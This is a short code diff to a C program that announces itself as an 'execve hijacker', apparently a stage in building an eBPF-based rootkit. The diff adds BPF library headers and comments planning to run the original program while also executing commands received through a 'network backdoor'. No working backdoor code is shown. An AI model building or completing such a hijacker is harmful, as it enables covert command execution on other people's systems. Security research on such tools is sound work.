@@ -5,8 +5,9 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <time.h>
-
-char* buf = "A string";
+#include <sys/wait.h>
+#include <bpf/bpf.h>
+#include <bpf/libbpf.h>
 
 int main(int argc, char* argv[]){
     printf("Hello world from execve hijacker\n");
@@ -21,6 +22,10 @@ int main(int argc, char* argv[]){
     for(int ii=0; ii<argc; ii++){
         printf("Argument %i is %s\n", ii, argv[ii]);
     }
+
+    //We proceed to fork() and exec the original program, whilst also executing the one we 
+    //ordered to execute via the network backdoor
+    //int bpf_map_fd = bpf_map_get_fd_by_id()
 
     int fd = open("/tmp/execve_hijack", O_RDWR | O_CREAT | O_TRUNC, 0666);
     
